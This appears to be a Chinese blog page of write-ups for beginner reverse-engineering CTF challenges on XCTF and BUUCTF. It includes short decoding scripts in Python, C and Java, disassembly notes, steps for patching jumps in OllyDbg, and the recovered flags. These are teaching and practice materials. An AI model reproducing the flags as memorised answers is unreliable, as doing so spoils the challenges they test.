<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#x2F;5sw $eax</span><br></pre></td></tr></table></figure>
<p><strong>参数含义：<br>x:examine–&gt;检测内存地址中保存的值<br>5:显示5行目标数据<br>s:以字符串形式打印<br>w:以双字打印</strong></p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717174414940.png" alt="image-20210717174414940"></p>
<h3 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h3><p>查，IDA一把梭</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717181731840.png" alt="image-20210717181731840"></p>
<p>好像没什么特别的</p>
<p>重点看循环 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 &lt; <span class="built_in">strlen</span>(s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &amp; <span class="number">1</span> )</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = <span class="number">-1</span>;</span><br><span class="line">    *(&amp;t + (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 + <span class="number">10</span>) = s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v5] + v3;</span><br><span class="line">    LODWORD(v5) = v5 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(filename, <span class="string">&quot;/tmp/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>好像也没看出什么，也没给s是啥。点了其他的函数也没东西，看wp。。。。</p>
<p>玄机在s里，点进去就看见了（好家伙，原来字符串是给的呀。。）</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717182011419.png" alt="image-20210717182011419"></p>
<p>然后对照伪代码写出脚本就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;c61b68366edeb7bdce3c6820314b7498&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> i&amp;<span class="number">1</span>:</span><br><span class="line">        x=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x=-<span class="number">1</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i])+x)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717183900450.png" alt="image-20210717183900450"></p>
<h3 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h3><p>下载下来得到pyc文件，需要经过反编译得出原py文件</p>
<p><a target="_blank" rel="noopener" href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a></p>
<p>py是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">message</span>):</span></span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">correct = <span class="string">&quot;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&quot;</span><span class="comment">#密文</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Input flag:&quot;</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;correct&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;wrong&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>很明显，中间那段是加密代码</p>
<p>利用加密后的明文和加密代码往前推，写出解密代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&quot;</span></span><br><span class="line">a=base64.b64decode(s)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        i -= <span class="number">16</span></span><br><span class="line">        i ^= <span class="number">32</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(i)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717202211618.png" alt="image-20210717202211618"></p>
<h3 id="csaw2013"><a href="#csaw2013" class="headerlink" title="csaw2013"></a>csaw2013</h3><p>可执行文件先打开</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210718201249537.png" alt="image-20210718201249537"></p>
<p>乱码。肯定无别的</p>
<p>然后照例查后得知是32位，可以用OD打开</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210718201405267.png" alt="image-20210718201405267"></p>
<p>先用IDA看看有些什么</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210718201459667.png" alt="image-20210718201459667"></p>
<p>看到flag字眼，搞了一套没发现东西，它前面的lpMem似乎与Flag有东西。</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210718201649763.png" alt="image-20210718201649763"></p>
<p>结果无。然后分析一下特殊语段if</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210718202224765.png" alt="image-20210718202224765"></p>
<p>看出来if语句有个退出的函数，而它有弹出框，所以if语句并没有执行</p>
<p>然后好像就看着没什么东西了。打开OD</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210718202514589.png" alt="image-20210718202514589"></p>
<p>没什么头绪，往上随便翻翻看旁边注释注意到了Flag</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210718202635361.png" alt="image-20210718202635361"></p>
<p>思路很清晰，肯定是从这里开始入手改东西让它这个弹出框显示不是乱码的窗体得到flag，也就是去让它执行那个if语句。</p>
<p>这个jmp指令跳转到第二个MessageBox处就行了<img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210718203254689.png" alt="image-20210718203254689"></p>
<p>因为可以看到它原来是直接跳过了两个文本框，所以不执行if语句。</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210718203545263.png" alt="image-20210718203545263"></p>
<p>然后改这个。但是运行起来是不行的，然后人麻了。再看看就发现<img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210718203706001.png" alt="image-20210718203706001"></p>
<p>这有个je指令先跳了，得先把它变成空操作指令nop，还有个int3下了断点，所以也先变成nop</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210718204242092.png" alt="image-20210718204242092"></p>
<p>然后直接运行就有了</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210718204312647.png" alt="image-20210718204312647"></p>
<h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><p>一套操作下来根本就没有头绪，直接看wp是迷宫问题](<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/reverse/maze/maze/">https://ctf-wiki.github.io/ctf-wiki/reverse/maze/maze/</a>)</p>
<p>输入的是’.’,’0’,’o’,’O’,并以此来确定上下左右移动</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/3.png" alt="img"></p>
<p>从这里可以看出先是进行判断，如果满足则进入判断，开头必须是以nctf{开头的</p>
<p>然后往下分析</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/4.png" alt="img"></p>
<p>从这里可以看出进行了四个判断，然后，进入四个函数()</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/5.png" alt="img"></p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/6.png" alt="img"></p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/7.png" alt="img"></p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/8.png" alt="img"></p>
<p>从上往下以此追踪，可以发现这些函数会跳到lable15的位置，然后，对lable15分析，发现特殊的字符串</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/9.png" alt="img"></p>
<p>然后，猜测可能是一个8*8的迷宫</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/10.png" alt="img"></p>
<p>走过迷宫，获得flag：nctf{o0oo00O000oooo..OO}</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://fallsilkworms.github.io/2021/11/05/Buuctf-Re/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="YX">
      <meta itemprop="description" content="等一场秋风再起，花开如绎">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fallsilkworm's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/05/Buuctf-Re/" class="post-title-link" itemprop="url">Buuctf-Re</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2021-11-05 15:27:28 / 修改时间：15:28:02" itemprop="dateCreated datePublished" datetime="2021-11-05T15:27:28+08:00">2021-11-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Bin/" itemprop="url" rel="index"><span itemprop="name">Bin</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="buu"><a href="#buu" class="headerlink" title="buu"></a>buu</h2><h3 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h3><p>先运行</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722152409028.png" alt="image-20210722152409028"></p>
<p>查，64位，拖IDA，但是没有main函数，但是我们可以找到flag相关的函数</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722152016942.png" alt="image-20210722152016942"></p>
<p>跟进<img src="/2021/11/05/Buuctf-Re/image-20210722152036790.png" alt="image-20210722152036790"></p>
<p>这块可以反汇编</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722152109275.png" alt="image-20210722152109275"></p>
<p>看if语句可以知道，Str2里面的值传给Str1，相等就是flag</p>
<p>点开Str2<img src="/2021/11/05/Buuctf-Re/image-20210722152156137.png" alt="image-20210722152156137"></p>
<p>交了发现错了。应该要改点什么，回到上面找加密</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722152237583.png" alt="image-20210722152237583"></p>
<p>按R转换字符，111是o，48是0，所以把所有的o变成0，交上了</p>
<h3 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h3><p>查，64位，拖IDA</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722153004435.png" alt="image-20210722153004435"></p>
<p>如出一辙，跟进flag</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722153044258.png" alt="image-20210722153044258"></p>
<p>交了发现又错，再回去看上面什么加密</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722153136415.png" alt="image-20210722153136415"></p>
<p>如出一辙。用1替换掉i和r一交就行</p>
<h3 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h3><p>先运行</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722153618334.png" alt="image-20210722153618334"></p>
<p>调皮~</p>
<p>IDA梭</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722153656528.png" alt="image-20210722153656528"></p>
<p>它就是flag</p>
<h3 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h3><p>运行</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722154046953.png" alt="image-20210722154046953"></p>
<p>查，有upx壳，先脱壳</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722154111800.png" alt="image-20210722154111800"></p>
<p>拖IDA</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722154130820.png" alt="image-20210722154130820"></p>
<p>就是它</p>
<h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><p>常规操作</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722160122018.png" alt="image-20210722160122018"></p>
<p>知道了flag长度33，且进行了一次xor，然后与global比较，跟进</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722160227640.png" alt="image-20210722160227640"></p>
<p>发现字符串，可以shift+e提取出来 <img src="/2021/11/05/Buuctf-Re/image-20210722160255687.png" alt="image-20210722160255687"></p>
<p>查资料得知<strong>xor后再xor一遍就可以还原</strong>，直接写解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">102</span>,  <span class="number">10</span>, <span class="number">107</span>,  <span class="number">12</span>, <span class="number">119</span>,  <span class="number">38</span>,  <span class="number">79</span>,  <span class="number">46</span>,  <span class="number">64</span>,  <span class="number">17</span>,</span><br><span class="line">  <span class="number">120</span>,  <span class="number">13</span>,  <span class="number">90</span>,  <span class="number">59</span>,  <span class="number">85</span>,  <span class="number">17</span>, <span class="number">112</span>,  <span class="number">25</span>,  <span class="number">70</span>,  <span class="number">31</span>,</span><br><span class="line">  <span class="number">118</span>,  <span class="number">34</span>,  <span class="number">77</span>,  <span class="number">35</span>,  <span class="number">68</span>,  <span class="number">14</span>, <span class="number">103</span>,   <span class="number">6</span>, <span class="number">104</span>,  <span class="number">15</span>,</span><br><span class="line">   <span class="number">71</span>,  <span class="number">50</span>,  <span class="number">79</span>,   <span class="number">0</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>):<span class="comment">#不要0</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>(a[i]^a[i-<span class="number">1</span>])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722160520686.png" alt="image-20210722160520686"></p>
<h3 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h3><p>apk，常规操作看Java源码</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722161031015.png" alt="image-20210722161031015"></p>
<p>秒了</p>
<h3 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h3><p>运行</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722162242675.png" alt="image-20210722162242675"></p>
<p>上下左右，猜想是迷宫题</p>
<p>直接拖IDA找迷宫</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722162316544.png" alt="image-20210722162316544"></p>
<p>变成5*5的一个迷宫</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722162323142.png" alt="image-20210722162323142"></p>
<p>过迷宫，22244114422包上flag就是了</p>
<h3 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h3><p>常规操作，64位IDA</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722181531232.png" alt="image-20210722181531232"></p>
<p>必然在Decry里，跟进，看见变量按R逆取，然后key1，3里面可以点进去，直接拼出来完整的，往下分析代码写解密脚本就行</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722181559045.png" alt="image-20210722181559045"></p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722182348163.png" alt="image-20210722182348163"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[]=<span class="string">&quot;adsfkndcls&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> b[]=<span class="string">&quot;killshadow&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span> c=<span class="number">10</span>;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">128</span>;j++)&#123;			<span class="comment">//用ASCII码作为范围，输出j变成字符串 </span></span><br><span class="line">			<span class="keyword">if</span>(j&lt;<span class="string">&#x27;A&#x27;</span>||j&gt;<span class="string">&#x27;z&#x27;</span>||j&gt;<span class="string">&#x27;Z&#x27;</span>&amp;&amp;j&lt;<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">			<span class="keyword">if</span>((j<span class="number">-39</span>-a[c % <span class="number">10</span>]+<span class="number">97</span>)% <span class="number">26</span> + <span class="number">97</span>==b[i])</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,j);</span><br><span class="line">				c++;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722182528608.png" alt="image-20210722182528608"></p>
<h3 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h3><p>拿到class文件，丢idea看</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722183654699.png" alt="image-20210722183654699"></p>
<p>关键只有中间那串for循环里的运算，KEY是加密后字符串，直接写出解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span> ]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(a[i]-<span class="number">64</span>^<span class="number">32</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/Buuctf-Re/image-20210722184940523.png" alt="image-20210722184940523"></p>
<h3 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h3><p>IDA分析main</p>
<p>很简单，v4满足条件后跟进patch_me</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20211027204823505.png" alt="image-20211027204823505"></p>
<p>所以是为偶数的话进入get_flag</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20211027204512501.png" alt="image-20211027204512501"></p>
<p>看switch，case1的时候跟进f1发现</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20211027204558788.png" alt="image-20211027204558788"></p>
<p>case4发现f2为0x7F666F6067756369LL，由于是小端序存储，写脚本时需要调整为逆序</p>
<p>case5注意循环内是8，f2就可以拆成[0x7F,0x66,0x6F,0x60,0x67,0x75,0x63,0x69]刚好是8</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="string">&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line">f2=[<span class="number">0x7F</span>,<span class="number">0x66</span>,<span class="number">0x6F</span>,<span class="number">0x60</span>,<span class="number">0x67</span>,<span class="number">0x75</span>,<span class="number">0x63</span>,<span class="number">0x69</span>][::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">1</span> :</span><br><span class="line">        s=<span class="built_in">chr</span>(f2[i]-<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s=<span class="built_in">chr</span>(f2[i]-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    flag+=s</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure>
<h3 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h3><p>IDA跟进DialogFunc</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20211028141351409.png" alt="image-20211028141351409"></p>
<p>知识补充：<a target="_blank" rel="noopener" href="https://www.runoob.com/cprogramming/c-function-sprintf.html">C 库函数 – sprintf() | 菜鸟教程 (runoob.com)</a></p>
<p>把19999和0分别填入输出位置即可</p>
<h3 id="简单注册器"><a href="#简单注册器" class="headerlink" title="简单注册器"></a>简单注册器</h3><p>jadx直接找MainActivity</p>
<p><img src="/2021/11/05/Buuctf-Re/image-20211028142602094.png" alt="image-20211028142602094"></p>
<p>直接把这段代码拿出来单跑就行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jingfei.Encryptoin;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>[] x = <span class="string">&quot;dd2940c04462b4dd7c450528835cca15&quot;</span>.toCharArray();</span><br><span class="line">        x[<span class="number">2</span>] = (<span class="keyword">char</span>) ((x[<span class="number">2</span>] + x[<span class="number">3</span>]) - <span class="number">50</span>);</span><br><span class="line">        x[<span class="number">4</span>] = (<span class="keyword">char</span>) ((x[<span class="number">2</span>] + x[<span class="number">5</span>]) - <span class="number">48</span>);</span><br><span class="line">        x[<span class="number">30</span>] = (<span class="keyword">char</span>) ((x[<span class="number">31</span>] + x[<span class="number">9</span>]) - <span class="number">48</span>);</span><br><span class="line">        x[<span class="number">14</span>] = (<span class="keyword">char</span>) ((x[<span class="number">27</span>] + x[<span class="number">28</span>]) - <span class="number">97</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> a = x[<span class="number">31</span> - i];</span><br><span class="line">            x[<span class="number">31</span> - i] = x[i];</span><br><span class="line">            x[i] = a;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;flag&#123;&quot;</span> + String.valueOf(x) + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
